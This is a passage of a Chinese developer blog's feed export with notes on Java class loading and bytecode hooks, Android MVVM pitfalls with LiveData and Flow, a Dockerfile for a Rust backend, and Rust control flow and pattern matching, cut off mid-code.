<span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>                c <span class="token operator">=</span> <span class="token function">findBootstrapClassOrNull</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">//if throws the exception ,the father can not complete the load</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>c <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            c <span class="token operator">=</span> <span class="token function">findClass</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>resolve<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">resolveClass</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意，双亲委派模型是Java设计者推荐给开发者的类加载器的实现方式，并不是强制规定的。大多数的类加载器都遵循这个模型，但是JDK中也有较大规模破坏双亲模型的情况，例如线程上下文类加载器（Thread Context ClassLoader）的出现，具体分析可以参见《深入理解Java虚拟机》。</p><h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><h3 id="什么是Hook"><a href="#什么是Hook" class="headerlink" title="什么是Hook"></a>什么是Hook</h3><p>hook我认为更像是一种思想，而非一门单独的技术，其实就是通过一些旁门左道去通过代理修改别人的代码来达成一些意想不到的功能。而通过这些旁门左道其实是没办法随心所欲的修改代码的，所以我们需要从某些地方入手，这些地方被称作<strong>hook点</strong>。</p><h3 id="怎么实现Hook"><a href="#怎么实现Hook" class="headerlink" title="怎么实现Hook"></a>怎么实现Hook</h3><p><img src="https://pic2.zhimg.com/80/v2-58f3800446ebb35fa8f38de1449a6af5_1440w.jpg" alt="img"></p><p>那我就讲讲最基础的反射/动态代理Hook吧。</p><p>假如我们导入的外部库的网络请求部分有这么一段代码:</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">object</span> ServiceHolder <span class="token punctuation">{</span>    <span class="token keyword">val</span> apiService<span class="token operator">:</span> IWebServiceRepository <span class="token operator">=</span> <span class="token function">WebServiceRepository</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// ...</span><span class="token punctuation">}</span><span class="token comment">// WebServiceRepository</span><span class="token keyword">class</span> WebServiceRepository <span class="token operator">:</span> IWebServiceRepository <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">val</span> BASE_URL <span class="token operator">=</span> <span class="token string">"https://api.bifrost.kim"</span>        <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">getJsonData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> Data <span class="token punctuation">{</span>        <span class="token comment">// ...</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然而它的接口改了，我们需要修改一下请求的方式</p><p>最简单的方法就是我们直接动态代理apiService，然后反射放进去。</p><p>但InvocationHandler提供的动态代理也许不是很方便，只能在头部或者尾部插入逻辑。即便我们只需要修改部分字符串，就得重写整个网络请求方法的逻辑。</p><p>那么更好的方法是什么呢，正是字节码插桩，我们使用字节码生成一个一样的类，再用asm稍微的修改这其中的部分逻辑即可。</p><h3 id="利用LSposed实现全局Hook-有时间再研究"><a href="#利用LSposed实现全局Hook-有时间再研究" class="headerlink" title="利用LSposed实现全局Hook (有时间再研究)"></a>利用LSposed实现全局Hook (有时间再研究)</h3><blockquote><p>有时间再说吧 我没研究（</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASM </tag>
            
            <tag> JVM </tag>
            
            <tag> 字节码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MMVM七宗罪</title>
      <link href="/2022/07/31/guilty-of-mvvm/"/>
      <url>/2022/07/31/guilty-of-mvvm/</url>
      
        <content type="html"><![CDATA[<h1 id="MVVM七宗罪"><a href="#MVVM七宗罪" class="headerlink" title="MVVM七宗罪"></a>MVVM七宗罪</h1><h2 id="其一-拿Fragment当LifecycleOwner"><a href="#其一-拿Fragment当LifecycleOwner" class="headerlink" title="其一 拿Fragment当LifecycleOwner"></a>其一 拿Fragment当LifecycleOwner</h2><p>Livedata之所以可以防止泄露，是因为它所持有的lifecycleowner走到<code>DESTORYED</code>时就会自动取消所有订阅。</p><p>然而Fragment在某些情况下并不会销毁，由于创建一个Fragment代价高昂，在Fragment的跳转过程中，如果使用返回栈，在返回这个fragment时并不会创建一个新的fragment，而是会复用老的Fragment，也就是Fragment的生命周期此时还未结束，但在之前离开这个fragment时，这个fragment中的view确实已经摧毁了。一般我们比较通常的写法是在<code>onViewCreated</code>中进行观察，而不是在<code>onCreate</code>,也就是说，我们在fragment中的view的生命周期开始时我们订阅了一个可订阅的东西，但却在fragment的生命周期结束时才取消订阅，这就导致了一个问题，我们退出界面时，fragment的view确实已经销毁了，但fragment没有销毁，于是再次进入fragment又会调用一次<code>onViewCreated</code>，就会导致我们重复订阅了两次。</p><p>解决方式就是使用<code>viewLifecycleOwner</code>，这样在view被销毁时就能取消订阅。</p><h2 id="其二-在launchWhenX中启用协程"><a href="#其二-在launchWhenX中启用协程" class="headerlink" title="其二 在launchWhenX中启用协程"></a>其二 在launchWhenX中启用协程</h2><h3 id="Flow-vs-LiveData"><a href="#Flow-vs-LiveData" class="headerlink" title="Flow vs. LiveData"></a>Flow vs. LiveData</h3><p>Flow总体上看确实功能比LiveData要更加强大，但由于LiveData是android jetpack的一部分，是专为android设计的，所以它在安卓应用场景下至少带来了两个好处</p><ul><li>生命周期管理 - lifecycleOwner进入destory阶段时，会自动取消订阅，防止内存泄漏</li><li>节省资源 - lifecycleOwner在进入STARTED时才会接收数据，避免在后台的无效计算</li></ul><p>如果想使用Flow来替代LiveData，那么至少需要做到这两点才行</p><p>第一点其实比较好实现，我们很多时候观察的Flow都是一个冷流，冷流的生命周期由订阅它的CoroutineScope决定。而官方的<code>lifecycle-runtime-ktx</code>已经为我们的所有lifecycleOwner添加了一个<code>lifecycleScope</code>，只要在lifecycleScope启动的协程中订阅就能保证第一点，而即使是热流也会自动取消订阅。我认为在这方面Flow取代LiveData是基本没有问题的，因为只要是个人就能想到使用lifecycleScope启动协程进行流的收集。</p><p>那么第二点要如何保证呢？</p><p>很多人就会想到所谓的<code>launchWhenX</code>，它能让开启的协程在<code>PAUSED</code>时挂起，在<code>STARTED</code>,<code>RESUMED</code>时恢复，似乎看起来很完美，对吗？</p><p>可惜的是，这样做只挂起了下游我们收集这个flow的协程，而上游的数据还在持续发送，如果这样做的话，第二点解决的其实很不彻底。</p><p>那么，解决方法是什么呢</p><h3 id="repeatOnLifecycle"><a href="#repeatOnLifecycle" class="headerlink" title="repeatOnLifecycle"></a>repeatOnLifecycle</h3><blockquote><p>lifecycle-runtime-ktx 自 <code>2.4.0-alpha01</code> 起，提供了一个新的协程构造器 <code>lifecyle.repeatOnLifecycle</code>， 它在离开 X 状态时销毁协程，再进入 X 状态时再启动协程。从其命名上也可以直观地认识这一点，即<strong>围绕某生命周期的进出反复启动新协程</strong>。</p></blockquote><p>是的，不再是挂起，而是直接销毁。这样做的话collect就不是被挂起，而是直接被取消订阅，如果我们这里订阅的是一个冷流，那么上游就会跟着被取消。这是不是就完美的解决了第二点？</p><p>同时一旦使用这个方法启动的协程来订阅Flow，这个Flow就也会具有LiveData的重要特性之一: 数据倒灌。这样看来，是不是只要用好这个方法，Flow就完全可以替代LiveData，对吧。</p><p>但其实LiveData和Flow还有一些不同之处，我们也不能完全抛弃LiveData，而是要因地制宜。</p><p>当然，使用它来收集flow还有一个快捷的写法<code>flowWithLifecycle(LifecycleOwner)</code></p><h2 id="其三-在onViewCreated中请求数据"><a href="#其三-在onViewCreated中请求数据" class="headerlink" title="其三 在onViewCreated中请求数据"></a>其三 在onViewCreated中请求数据</h2><p>在 MVVM 中, ViewModel 的重要职责是解耦 View 与 Model。</p><ul><li>View 向 ViewModel 发出指令，请求数据</li><li>View 通过 DataBinding 或 LiveData 等订阅 ViewModel 的数据变化</li></ul><p>关于订阅 ViewModel 的时机，大家一般放在 <code>onViewCreated</code> ，这是没有问题的。但是一个常犯的错误是将 ViewModel 中首次的数据加载也放到 <code>onViewCreated</code> 中进行。如果 ViewModel 在 <code>onViewCreated</code> 中请求数据，当 View 因为横竖屏等原因重建时会再次请求，而我们知道 ViewModel 的生命周期长于 View，数据可以跨越 View 的生命周期存在，所以没有必要随着 View 的重建反复请求。</p><blockquote><p>ViewModel 的初次数据加载推荐放到 <code>init{}</code> 中进行，这样可以保证 <code>ViewModelScope</code> 中只加载一次</p></blockquote><h2 id="其四-使用LiveData-amp-StateFlow发送Events"><a href="#其四-使用LiveData-amp-StateFlow发送Events" class="headerlink" title="其四 使用LiveData &amp; StateFlow发送Events"></a>其四 使用LiveData &amp; StateFlow发送Events</h2><p>LiveData和StateFlow被设计来保存一个状态，单从这个角度来说，它们设计得非常到位，完美的符合我们的需求。但如果我们的需求不是保存一个状态，而只是希望它在收到一个值时能够通知观察者，也许它们就不太适合了。</p><p>LiveData在设计时被赋予了数据倒灌的特性，回到界面时会再次通知一次观察者，事件应该是具有时效性的，这样与我们的需求不符。</p><p>LiveData和StateFlow都会产生丢值的问题，因为LiveData和StateFlow设计的时候都只考虑了保留一个值的情况，所以对他们而言，最新的值才是最重要的，已经过期的值就没有必要通知，减少下游的处理逻辑，节省性能，所以这并不是bug，而是一种特性。StateFlow还会忽略重复发送的相同的值，这个特性被称为<strong>防抖</strong>。</p><h2 id="其五-在Repository层中使用LiveData"><a href="#其五-在Repository层中使用LiveData" class="headerlink" title="其五 在Repository层中使用LiveData"></a>其五 在Repository层中使用LiveData</h2><p>我们应该经常在仓库层使用RxJava或者Flow，但其实很少见到说在仓库层使用LiveData，在我印象中这三者应该至少是比较类似的东西，那么为什么LiveData不行呢？有两点点原因:</p><ul><li>重度依赖lifecycle，仓库层获取不到lifecycleOwner，只能使用observeForever这种可能造成内存泄漏的方法来进行</li><li>不支持线程切换 故所有操作符实际上默认都是在主线程上运行</li></ul><h2 id="其六-ViewModel接口暴露不合理"><a href="#其六-ViewModel接口暴露不合理" class="headerlink" title="其六 ViewModel接口暴露不合理"></a>其六 ViewModel接口暴露不合理</h2><ul><li>暴露Mutable状态</li><li>暴露suspend方法</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> MVVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为Rust写的后端配置docker</title>
      <link href="/2022/05/29/docker-configuration-for-rust-server/"/>
      <url>/2022/05/29/docker-configuration-for-rust-server/</url>
      
        <content type="html"><![CDATA[<h1 id="为Rust写的后端配置docker"><a href="#为Rust写的后端配置docker" class="headerlink" title="为Rust写的后端配置docker"></a>为Rust写的后端配置docker</h1><p>最近尝试用rust写了一个后端服务，想部署到服务器上。当然是用docker部署，自从接触了docker，我很快便爱上了它~</p><p>然后我发现rust的docker配置似乎与java不同..?java只需要把编译出来的jar扔到docker里面，然后直接java -jar便可以运行，但rust似乎需要把整个代码全部copy到docker中在编译环境编译然后才能部署，然而rust的编译又极其消耗性能，导致我第一次部署时直接把服务器给卡崩了。</p><p>后来花了50块给服务器升级成了2c4g，再次尝试部署，这次又出现了经典问题</p><p><img src="https://persecution-1301196908.cos.ap-chongqing.myqcloud.com/image_bed/2022052901.png" alt="2022052901"></p><p>怎么办呢，当然是给cargo换镜像源咯。</p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">RUN touch /usr/local/cargo/config.toml# cargo 上海交大镜像源RUN sed -e a\[source.crates-io] /usr/local/cargo/config.toml;\    sed -e a\registry=\"https://github.com/rust-lang/crates.io-index\" /usr/local/cargo/config.toml; \    sed -e a\replace-with=\'sjtu\' /usr/local/cargo/config.toml; \    sed -e a\[source.sjtu] /usr/local/cargo/config.toml; \    sed -e a\registry=\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这下子就部署成功了</p><p>吐槽一下，每次部署都要花大概半个小时，而且cpu占用率能吃到99.75%，编译成功后的镜像大小能达到6个G，实在是不太行。</p><p>全部代码</p><pre class="line-numbers language-dockerfile" data-language="dockerfile"><code class="language-dockerfile">FROM rustWORKDIR /usr/src/collection-apiCOPY . .RUN touch /usr/local/cargo/config.toml# cargo 上海交大镜像源RUN sed -e a\[source.crates-io] /usr/local/cargo/config.toml;\    sed -e a\registry=\"https://github.com/rust-lang/crates.io-index\" /usr/local/cargo/config.toml; \    sed -e a\replace-with=\'sjtu\' /usr/local/cargo/config.toml; \    sed -e a\[source.sjtu] /usr/local/cargo/config.toml; \    sed -e a\registry=\"https://mirrors.sjtug.sjtu.edu.cn/git/crates.io-index/\"# Rustup 清华镜像源ENV RUSTUP_DIST_SERVER https://mirrors.tuna.tsinghua.edu.cn/rustupENV DATABASE_URL *RUN cargo install --path .CMD ["collection-api"]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h2><blockquote><p>在本地编译对应目标系统的产品</p></blockquote><p>如果能用这个的话，那就只需要把产品扔到docker里面，docker源也只需要用最小的airplane了吧。</p><p>下次研究。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rust </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Rust笔记其二</title>
      <link href="/2022/05/24/rust-note-2/"/>
      <url>/2022/05/24/rust-note-2/</url>
      
        <content type="html"><![CDATA[<h1 id="Rust笔记其二"><a href="#Rust笔记其二" class="headerlink" title="Rust笔记其二"></a>Rust笔记其二</h1><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><p>比较类似go吧，if for这些后面跟的表达式都不用用括号包起来</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 这里比较像kotlin，没有采用传统的三元运算符</span><span class="token keyword">let</span> condition <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">let</span> number <span class="token operator">=</span> <span class="token keyword">if</span> condition <span class="token punctuation">{</span>        <span class="token number">5</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token number">6</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment">// 多分支</span><span class="token keyword">let</span> n <span class="token operator">=</span> <span class="token number">6</span><span class="token punctuation">;</span><span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number is divisible by 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number is divisible by 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> n <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number is divisible by 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"number is not divisible by 4, 3, or 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// for循环</span><span class="token comment">// 有点类似kt, 支持区间</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token number">1</span><span class="token punctuation">..=</span><span class="token number">5</span> <span class="token punctuation">{</span>   <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 遍历集合</span><span class="token comment">// 注意所有权的转移，不取引用的话下面就用不了container了</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token operator">&amp;</span>container <span class="token punctuation">{</span>  <span class="token comment">// ...</span><span class="token punctuation">}</span><span class="token comment">// 遍历时修改</span><span class="token keyword">for</span> item <span class="token keyword">in</span> <span class="token operator">&amp;</span><span class="token keyword">mut</span> collection <span class="token punctuation">{</span>  <span class="token comment">// ...</span><span class="token punctuation">}</span><span class="token comment">// 遍历index和值</span><span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// `.iter()` 方法把 `a` 数组变成一个迭代器</span><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span> v<span class="token punctuation">)</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">enumerate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"第{}个元素是{}"</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> v<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 无限循环 等价于while(true)</span><span class="token keyword">loop</span> <span class="token punctuation">{</span>   <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"again!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>值得注意的是，rust的break既可以单独使用，也可以让他返回一个值</p><p>loop是一个表达式，因而可以返回一个值</p></blockquote><h2 id="模式匹配"><a href="#模式匹配" class="headerlink" title="模式匹配"></a>模式匹配</h2><blockquote><p>画重点，rust的模式匹配非常强大，以至于其他语言都在抄</p></blockquote><h3 id="match"><a href="#match" class="headerlink" title="match"></a>match</h3><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 这里是比较类似于其他语言switch的用法</span><span class="token comment">// 但match比switch强大得多</span><span class="token keyword">enum</span> <span class="token type-definition class-name">Coin</span> <span class="token punctuation">{</span>    <span class="token class-name">Penny</span><span class="token punctuation">,</span>    <span class="token class-name">Nickel</span><span class="token punctuation">,</span>    <span class="token class-name">Dime</span><span class="token punctuation">,</span>    <span class="token class-name">Quarter</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">value_in_cents</span><span class="token punctuation">(</span>coin<span class="token punctuation">:</span> <span class="token class-name">Coin</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">u8</span> <span class="token punctuation">{</span>    <span class="token keyword">match</span> coin <span class="token punctuation">{</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Penny</span> <span class="token operator">=&gt;</span>  <span class="token punctuation">{</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Lucky penny!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token number">1</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Nickel</span> <span class="token operator">=&gt;</span> <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Dime</span> <span class="token operator">=&gt;</span> <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Quarter</span> <span class="token operator">=&gt;</span> <span class="token number">25</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// match是一个表达式，可以用来赋值</span><span class="token keyword">enum</span> <span class="token type-definition class-name">IpAddr</span> <span class="token punctuation">{</span>   <span class="token class-name">Ipv4</span><span class="token punctuation">,</span>   <span class="token class-name">Ipv6</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> ip1 <span class="token operator">=</span> <span class="token class-name">IpAddr</span><span class="token punctuation">::</span><span class="token class-name">Ipv6</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> ip_str <span class="token operator">=</span> <span class="token keyword">match</span> ip1 <span class="token punctuation">{</span>        <span class="token class-name">IpAddr</span><span class="token punctuation">::</span><span class="token class-name">Ipv4</span> <span class="token operator">=&gt;</span> <span class="token string">"127.0.0.1"</span><span class="token punctuation">,</span>        _ <span class="token operator">=&gt;</span> <span class="token string">"::1"</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"{}"</span><span class="token punctuation">,</span> ip_str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">// 模式绑定 （有点像解构）</span><span class="token keyword">enum</span> <span class="token type-definition class-name">Coin</span> <span class="token punctuation">{</span>    <span class="token class-name">Penny</span><span class="token punctuation">,</span>    <span class="token class-name">Nickel</span><span class="token punctuation">,</span>    <span class="token class-name">Dime</span><span class="token punctuation">,</span>    <span class="token class-name">Quarter</span><span class="token punctuation">(</span><span class="token class-name">UsState</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// 25美分硬币</span><span class="token punctuation">}</span><span class="token keyword">fn</span> <span class="token function-definition function">value_in_cents</span><span class="token punctuation">(</span>coin<span class="token punctuation">:</span> <span class="token class-name">Coin</span><span class="token punctuation">)</span> <span class="token punctuation">-&gt;</span> <span class="token keyword">u8</span> <span class="token punctuation">{</span>    <span class="token keyword">match</span> coin <span class="token punctuation">{</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Penny</span> <span class="token operator">=&gt;</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Nickel</span> <span class="token operator">=&gt;</span> <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Dime</span> <span class="token operator">=&gt;</span> <span class="token number">10</span><span class="token punctuation">,</span>        <span class="token comment">// 这里可以通过这样的写法直接拿到state</span>        <span class="token class-name">Coin</span><span class="token punctuation">::</span><span class="token class-name">Quarter</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>            <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"State quarter from {:?}!"</span><span class="token punctuation">,</span> state<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token number">25</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">// 有时会遇到只有一个模式的值需要被处理，其它值直接忽略的场景，如果用 match 来处理就要写成下面这样</span><span class="token keyword">let</span> v <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3u8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">match</span> v <span class="token punctuation">{</span>   <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>   _ <span class="token operator">=&gt;</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment">// 这种情况下可以直接用语法糖简化</span><span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">=</span> v <span class="token punctuation">{</span>    <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"three"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>match的匹配必须穷尽所有的情况，也就是如果不列出所有的可能，必须定义_ =&gt;分支</p></blockquote><h3 id="matches-宏"><a href="#matches-宏" class="headerlink" title="matches!宏"></a>matches!宏</h3><blockquote><p>跟java中的String#matches比较类似，如果我只是想知道某个实例是否匹配上了我给与的模式，可以不用特意去macth,直接调用matches!宏。</p></blockquote><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 使用match</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token char string">'f'</span><span class="token punctuation">;</span><span class="token keyword">let</span> matched <span class="token operator">=</span> <span class="token keyword">match</span> foo <span class="token punctuation">{</span>    <span class="token char string">'A'</span><span class="token punctuation">..</span><span class="token char string">'Z'</span> <span class="token operator">|</span> <span class="token char string">'a'</span><span class="token punctuation">..</span><span class="token char string">'z'</span> <span class="token operator">=&gt;</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    _ <span class="token operator">=&gt;</span> <span class="token boolean">false</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment">// 使用matches!</span><span class="token keyword">let</span> foo <span class="token operator">=</span> <span class="token char string">'f'</span><span class="token punctuation">;</span><span class="token keyword">let</span> matched <span class="token operator">=</span> <span class="token macro property">matches!</span><span class="token punctuation">(</span>foo<span class="token punctuation">,</span> <span class="token char string">'A'</span><span class="token punctuation">..</span><span class="token char string">'Z'</span> <span class="token operator">|</span> <span class="token char string">'a'</span><span class="token punctuation">..</span><span class="token char string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解构"><a href="#解构" class="headerlink" title="解构"></a>解构</h3><p>解构其实也是模式匹配实现的，在上一节笔记中已经写过了，不做详细介绍</p><h3 id="匹配守卫"><a href="#匹配守卫" class="headerlink" title="匹配守卫"></a>匹配守卫</h3><blockquote><p>在要匹配的模式后面可以加上if condition，来对模式匹配进行进一步限制</p></blockquote><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> x <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> y <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token keyword">match</span> x <span class="token punctuation">{</span>        <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span 